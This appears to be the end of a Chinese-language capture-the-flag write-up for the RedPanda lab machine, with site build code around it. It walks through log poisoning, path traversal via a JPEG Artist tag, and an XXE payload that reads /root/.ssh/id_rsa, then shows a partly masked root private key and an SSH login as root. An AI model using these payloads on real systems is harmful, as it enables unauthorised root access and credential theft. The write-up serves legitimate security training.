</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u65E5\u5FD7\u901A\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\u5206\u5272</p><p>0 =&gt; \u72B6\u6001\u7801 1 =&gt; ip \u5730\u5740 2 =&gt; User Agent 3 =&gt; \u8BBF\u95EE\u7684\u8DEF\u5F84</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">parseLog</span><span class="token punctuation">(</span><span class="token class-name">String</span> line<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> strings <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;\\\\|\\\\|&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;status_code&quot;</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>strings<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;ip&quot;</span><span class="token punctuation">,</span> strings<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;user_agent&quot;</span><span class="token punctuation">,</span> strings<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;uri&quot;</span><span class="token punctuation">,</span> strings<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> map<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u8BFB\u53D6\u8BBF\u95EE\u8DEF\u5F84\u56FE\u7247\u7684\u4F5C\u8005</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getArtist</span><span class="token punctuation">(</span><span class="token class-name">String</span> uri<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">JpegProcessingException</span>
<span class="token punctuation">{</span>
    <span class="token class-name">String</span> fullpath <span class="token operator">=</span> <span class="token string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> <span class="token operator">+</span> uri<span class="token punctuation">;</span>
    <span class="token class-name">File</span> jpgFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>fullpath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">return</span> <span class="token string">&quot;N/A&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u800C\u8FD9\u4E2A\u6587\u4EF6\u5939\u6211\u4EEC\u6CA1\u6709\u5199\u7684\u6743\u9650, \u4F46\u662F\u53EF\u4EE5\u901A\u8FC7\u62FC\u63A5\u8DEF\u5F84<code>/../../../../../../../tmp/somefile</code>\u7684\u65B9\u5F0F\u6765\u8BFB\u53D6\u4E00\u4E2A jpg \u6587\u4EF6</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/opt/panda_search/src/main/resources/static$ <span class="token function">touch</span> a
touch: cannot <span class="token function">touch</span> <span class="token string">&#39;a&#39;</span><span class="token builtin class-name">:</span> Permission denied
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>\u901A\u8FC7 main \u51FD\u6570 \u53EF\u4EE5\u53D1\u73B0\u4E5F\u5B58\u5728\u62FC\u63A5\u8DEF\u5F84\u7684\u53EF\u80FD\u6027.</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JDOMException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">JpegProcessingException</span> <span class="token punctuation">{</span>
    <span class="token class-name">File</span> log_fd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">&quot;/opt/panda_search/redpanda.log&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Scanner</span> log_reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>log_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>log_reader<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token class-name">String</span> xmlPath <span class="token operator">=</span> <span class="token string">&quot;/credits/&quot;</span> <span class="token operator">+</span> artist <span class="token operator">+</span> <span class="token string">&quot;_creds.xml&quot;</span><span class="token punctuation">;</span>
        <span class="token function">addViewTo</span><span class="token punctuation">(</span>xmlPath<span class="token punctuation">,</span> parsed_data<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;uri&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u56E0\u6B64\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u65E5\u5FD7, \u52A0\u8F7D\u4E00\u4E2A\u7BE1\u6539\u540E\u7684 jpg \u6587\u4EF6.</p><blockquote><p>/opt/panda_search/src/main/resources/static/../../../../../../tmp/xxx.jpg</p></blockquote><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token number">304</span><span class="token operator">||</span><span class="token number">10.10</span>.16.2<span class="token operator">||</span>Mozilla <span class="token punctuation">..</span>.<span class="token operator">||</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tmp/xxx.jpg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u518D\u901A\u8FC7 jpg \u7684 Artist \u8BBF\u95EE\u4E00\u4E2A\u6076\u610F\u7684 xml \u6587\u4EF6</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ exiftool <span class="token parameter variable">-Artist</span> xxx.jpg
Artist                          <span class="token builtin class-name">:</span> woodenk

\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ exiftool <span class="token parameter variable">-Artist</span><span class="token operator">=</span><span class="token string">&quot;../tmp/xxe&quot;</span> xxx.jpg
<span class="token number">1</span> image files updated

\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ exiftool <span class="token parameter variable">-Artist</span> xxx.jpg
Artist                          <span class="token builtin class-name">:</span> <span class="token punctuation">..</span>/tmp/xxe

\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u51C6\u5907\u6076\u610F xml</p><div class="language-xml ext-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">author</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>credits</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/angy.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/shy.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/crafty.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">&gt;</span></span>/img/peter.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>views</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>views</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>totalviews</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>totalviews</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>credits</span><span class="token punctuation">&gt;</span></span>its&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u7B49\u5F85\u5B9A\u65F6\u4EFB\u52A1\u89E6\u53D1.</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> xx
-rw-rw-r-- <span class="token number">1</span> woodenk logs    <span class="token number">151</span> Dec  <span class="token number">3</span> <span class="token number">23</span>:38 xxe_creds.xml
-rw-rw-r-- <span class="token number">1</span> woodenk logs <span class="token number">111378</span> Dec  <span class="token number">3</span> <span class="token number">23</span>:36 xxx.jpg
woodenk@redpanda:/tmp$ <span class="token function">chmod</span> <span class="token number">777</span> xxe_creds.xml
woodenk@redpanda:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;200||10.10.16.8||hello||/../../../../../../tmp/xxx.jpg&quot;</span> <span class="token operator">&gt;&gt;</span> /opt/panda_search/redpanda.log
<span class="token operator">&lt;</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tmp/xx.jpg&quot; <span class="token operator">&gt;&gt;</span> /opt/panda_search/redpanda.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u8BFB\u53D6 <code>xxe_credits.xml</code> \u6210\u529F\u5F97\u5230 root \u79C1\u94A5</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>woodenk@redpanda:/tmp$ <span class="token function">cat</span> xxe_creds.xml
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE author<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>credits<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>author<span class="token operator">&gt;</span>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbcxxxxxxxxxxxxxxxxxxxxxxxxxxxBRbb26UW29
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
<span class="token assign-left variable">RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE</span><span class="token operator">=</span>
-----END OPENSSH PRIVATE KEY-----<span class="token operator">&lt;</span>/author<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>image<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>uri<span class="token operator">&gt;</span>/img/angy.jpg<span class="token operator">&lt;</span>/uri<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>views<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/views<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>/image<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>image<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>uri<span class="token operator">&gt;</span>/img/shy.jpg<span class="token operator">&lt;</span>/uri<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>views<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/views<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>/image<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>image<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>uri<span class="token operator">&gt;</span>/img/crafty.jpg<span class="token operator">&lt;</span>/uri<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>views<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/views<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>/image<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>image<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>uri<span class="token operator">&gt;</span>/img/peter.jpg<span class="token operator">&lt;</span>/uri<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>views<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/views<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>/image<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>totalviews<span class="token operator">&gt;</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/totalviews<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/credits<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u767B\u5F55</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbcxxxxxxxxxxxxxxxxxxxxxxxxxxxBRbb26UW29
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=FuZGE=
-----END OPENSSH PRIVATE KEY-----&quot;</span> <span class="token operator">&gt;</span> redpanda.key

\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ <span class="token function">chmod</span> <span class="token number">600</span> redpanda.key

\u250C\u2500\u2500<span class="token punctuation">(</span>xzy\u327Fxzy-Computer<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
\u2514\u2500$ <span class="token function">ssh</span> root@10.129.227.207 <span class="token parameter variable">-i</span> redpanda.key
<span class="token punctuation">..</span>.
Last login: Thu Jun <span class="token number">30</span> <span class="token number">13</span>:17:41 <span class="token number">2022</span>
root@redpanda:~<span class="token comment"># cat root.txt</span>
5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,88),m=[v];function g(b,x){return s(),a("div",null,m)}var w=n(k,[["render",g],["__file","RedPanda.html.vue"]]);export{w as default};
